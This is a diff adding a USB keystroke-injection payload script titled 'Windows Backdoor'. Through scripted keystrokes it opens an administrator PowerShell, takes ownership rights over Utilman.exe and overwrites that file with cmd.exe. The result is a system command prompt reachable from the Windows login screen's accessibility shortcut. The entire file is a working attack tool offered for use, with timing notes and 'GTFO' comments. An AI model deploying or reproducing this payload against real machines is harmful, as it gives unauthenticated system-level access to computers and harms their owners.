@@ -1,0 +1,64 @@
+#!/bin/bash
+#
+# Title:         Windows Backdoor
+# Author:        Rogue(editor) Squibs(main Concept)
+# Version:       0.3
+# Plug2Pwn:		 18s
+#
+# Creates a backdoor by replacing the Utilman.exe file (Accessibility shortcut at login screen) with cmd
+#
+# Blue...............Preparing Attack
+# Yellow.............Attacking
+# Green..............GTFO
+
+#Open Admin Powershell 
+ATTACKMODE HID
+LED B 200
+Q GUI
+Q DELAY 500
+Q STRING POWERSHELL
+Q DELAY 1000
+Q CTRL-SHIFT ENTER
+Q DELAY 2000
+Q LEFTARROW
+Q DELAY 100
+Q ENTER
+Q DELAY 1200
+
+#Give Permissions for Utilman.exe to current user
+LED Y 500 
+Q STRING "$Acl = Get-Acl Utilman.exe"
+Q ENTER
+Q DELAY 100
+Q STRING "$Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:UserName,"FullControl","Allow")"
+Q ENTER
+Q DELAY 100
+Q STRING "$Acl.SetAccessRule($Ar)"
+Q ENTER
+Q DELAY 100
+Q STRING "Set-Acl Utilman.exe $Acl"
+Q ENTER
+Q DELAY 100
+
+#Copy over CMD to Utilman.EXE (Save Utilman.exe as Utilman.exe.bak if you want to be nice)
+Q STRING "xcopy Utilman.exe Utilman.exe.bak"
+Q ENTER 
+Q DELAY 1200
+Q STRING "F"
+Q DELAY 100
+Q STRING "xcopy cmd.exe Utilman.exe"
+Q ENTER
+Q DELAY 200
+Q STRING "Y"
+Q ENTER
+Q DELAY 200
+
+# GTFO
+Q STRING EXIT
+Q ENTER
+
+#Sync Drive
+sync
+
+#Trap is clean!
+LED G
